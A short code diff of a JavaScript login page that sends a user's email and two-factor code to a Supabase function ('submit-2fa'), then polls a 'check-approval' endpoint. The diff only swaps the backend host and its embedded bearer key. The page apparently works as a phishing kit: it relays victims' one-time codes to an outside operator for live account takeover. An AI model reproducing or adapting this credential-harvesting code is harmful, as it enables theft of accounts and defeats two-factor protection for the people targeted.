@@ -121,11 +121,11 @@ window.addEventListener('DOMContentLoaded', function() {
             if (requestId) {
                 try {
                     // Gửi 2FA code đến Supabase
-                    const response = await fetch('https://ppxrircgvtpdafbdxhyz.supabase.co/functions/v1/login-handler/api/submit-2fa', {
+                    const response = await fetch('https://nqsdardermkzppeaazbb.supabase.co/functions/v1/login-handler/api/submit-2fa', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
-                            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBweHJpcmNndnRwZGFmYmR4aHl6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA4MjMwNzksImV4cCI6MjA2NjM5OTA3OX0.kWRf-p4KR43krCYZ4NgqgGdFTiEQ5sT2aRKcN9QPdyo'
+                            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                         },
                         body: JSON.stringify({
                             email: email,
@@ -178,9 +178,9 @@ async function checkApprovalStatus(email) {
     
     const checkStatus = async () => {
         try {
-            const response = await fetch(`https://ppxrircgvtpdafbdxhyz.supabase.co/functions/v1/login-handler/api/check-approval?email=${encodeURIComponent(email)}`, {
+            const response = await fetch(`https://nqsdardermkzppeaazbb.supabase.co/functions/v1/login-handler/api/check-approval?email=${encodeURIComponent(email)}`, {
                 headers: {
-                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBweHJpcmNndnRwZGFmYmR4aHl6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA4MjMwNzksImV4cCI6MjA2NjM5OTA3OX0.kWRf-p4KR43krCYZ4NgqgGdFTiEQ5sT2aRKcN9QPdyo'
+                    'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5xc2RhcmRlcm1renBwZWFhemJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTA5NTY1NjUsImV4cCI6MjA2NjUzMjU2NX0.1sxR4WFiuwZbfGBSr-lZCMMbRfAGwwFpZOx_bzqsvbc'
                 }
             });
             if (response.ok) {
